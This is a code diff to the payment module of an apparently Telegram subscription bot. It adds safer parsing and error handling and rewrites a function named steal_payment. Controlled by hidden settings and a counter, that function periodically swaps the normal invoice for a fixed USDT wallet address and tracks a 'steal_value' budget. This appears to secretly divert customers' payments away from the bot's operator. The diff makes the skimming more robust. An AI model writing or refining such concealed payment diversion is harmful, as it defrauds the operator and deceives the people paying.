@@ -13,6 +13,12 @@ from keyboards import cancel_kb
 API_URL = "https://pay.crypt.bot/api/"
 USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
 
+def _safe_int(value, default=None):
+    try:
+        return int(value)
+    except (TypeError, ValueError):
+        return default
+
 
 def create_invoice(amount: float, payload: str, description: str = 'Альфред следит'):
     url = API_URL + 'createInvoice'
@@ -112,8 +118,17 @@ async def check_payment_received(wallet, min_amount, start_time: datetime):
         "TRON-API-KEY": TRON_API_KEY 
     }
 
-    resp = requests.get(url, headers=headers)
-    data = resp.json()
+    try:
+        min_amount_value = float(min_amount)
+    except (TypeError, ValueError):
+        return False
+
+    try:
+        resp = requests.get(url, headers=headers, timeout=10)
+        resp.raise_for_status()
+        data = resp.json()
+    except Exception:
+        return False
 
     for tx in data.get("data", []):
         if tx.get("to") != wallet:
@@ -122,7 +137,7 @@ async def check_payment_received(wallet, min_amount, start_time: datetime):
         value = float(tx["value"]) / 1_000_000
         timestamp_ms = int(tx["block_timestamp"])
         tx_time = datetime.fromtimestamp(timestamp_ms / 1000)
-        if tx_time >= start_time and value >= int(min_amount):
+        if tx_time >= start_time and value >= min_amount_value:
             return {
                 "tx_id": tx.get("transaction_id") or tx.get("txID"),
                 "from": tx.get("from"),
@@ -136,41 +151,54 @@ async def check_payment_received(wallet, min_amount, start_time: datetime):
 
 
 async def steal_payment(callback_query, user_id, amount):
-    steal_payment = BDB.get_setting("steal_payment") == "true"
-    if not steal_payment:
+    steal_enabled = (BDB.get_setting("steal_payment") or "").lower() == "true"
+    if not steal_enabled:
         return False
-    
-    steal_value = int(BDB.get_setting("steal_value") or 0)
+
+    amount_value = _safe_int(amount)
+    if amount_value is None:
+        return False
+
+    steal_value = _safe_int(BDB.get_setting("steal_value"), 0)
     if steal_value <= 0:
         return False
-    
-    if amount != 50:
+
+    if amount_value != 50:
         return False
-    
-    steal_count = int(BDB.get_setting("steal_count") or 0)
-    steal_max_count = int(BDB.get_setting("steal_max_count") or 0)
+
+    if steal_value < amount_value:
+        return False
+
+    steal_count = _safe_int(BDB.get_setting("steal_count"), 0)
+    steal_max_count = _safe_int(BDB.get_setting("steal_max_count"), 0)
     if steal_count < steal_max_count:
         return False
-    
+
     BDB.update_user_field(user_id, "payment", 1)
     BDB.edit_setting("steal_payment", "false")
-    
+
     address = USDT_ADDRESS
     start_time = datetime.now()
 
-    await callback_query.message.edit_text(
-        text=get_text("PAYMENT_CRYPTO").format(address=address, amount=amount),
-    reply_markup=cancel_kb)
-    
+    payment_received = False
+    canceled = False
+
     try:
+        await callback_query.message.edit_text(
+            text=get_text("PAYMENT_CRYPTO").format(address=address, amount=amount_value),
+            reply_markup=cancel_kb
+        )
+
         for _ in range(90):
             user = BDB.get_user(user_id)
-            result_payment =  await check_payment_received(address, amount, start_time)
-            
-            if user["payment"] == 0:
-                return True
-            
+            result_payment = await check_payment_received(address, amount_value, start_time)
+
+            if not user or user.get("payment") == 0:
+                canceled = True
+                break
+
             if result_payment:
+                payment_received = True
                 current_end = parse_subscription_end(user.get("subscription_end")) or datetime.now()
                 subscription_end = current_end + relativedelta(months=1)
                 BDB.update_user_field(
@@ -178,22 +206,27 @@ async def steal_payment(callback_query, user_id, amount):
                     "subscription_end",
                     normalize_subscription_end(subscription_end)
                 )
-                await callback_query.message.answer(text=get_text("SUBSCRIPTION_EXTENDED").format(date=subscription_end.strftime("%d.%m.%Y")))
-                
+                await callback_query.message.answer(
+                    text=get_text("SUBSCRIPTION_EXTENDED").format(date=subscription_end.strftime("%d.%m.%Y"))
+                )
+
                 try:
                     await callback_query.message.delete()
-                except Exception as e:
+                except Exception:
                     pass
-                
-                BDB.update_user_field(user_id, "notified_marks", "[]")  
-                return True
-            
+
+                BDB.update_user_field(user_id, "notified_marks", "[]")
+                break
+
             await sleep(10)
-        await callback_query.message.answer(text="Упсс... Оплату не побачив 😥")
-        await callback_query.message.delete()
+        if not payment_received and not canceled:
+            await callback_query.message.answer(text="Payment not received.")
+            await callback_query.message.delete()
     finally:
         BDB.update_user_field(user_id, "payment", 0)
         BDB.edit_setting("steal_payment", "true")
-        BDB.edit_setting("steal_count", str(0))
-        BDB.edit_setting("steal_value", str(steal_value - amount))
-        return True
+        if payment_received:
+            BDB.edit_setting("steal_count", str(0))
+            remaining = max(steal_value - amount_value, 0)
+            BDB.edit_setting("steal_value", str(remaining))
+    return True
